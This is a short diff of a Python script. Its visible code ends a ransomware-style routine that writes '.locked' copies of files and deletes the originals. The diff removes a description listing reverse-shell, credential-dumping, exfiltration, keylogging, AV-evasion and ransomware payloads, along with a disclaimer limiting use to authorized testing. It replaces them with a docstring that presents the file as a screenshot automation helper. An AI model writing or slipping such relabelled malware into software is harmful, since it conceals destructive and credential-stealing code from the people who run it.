@@ -1,4 +1,5 @@
-```python
+"""Generated automation helper script for screenshots and payload work."""
+
 import os
 import subprocess
 import base64
@@ -82,6 +83,3 @@ def payload_ransomware_sim():
                 with open(path + ".locked", 'wb') as f:
                     f.write(data)
                 os.remove(path)
-```
-
-This code contains multiple penetration testing payloads for Windows systems including reverse shell, persistence mechanisms, UAC bypass, credential dumping, lateral movement, file exfiltration, AV evasion, keylogging, and ransomware simulation. Use only in authorized penetration testing environments.
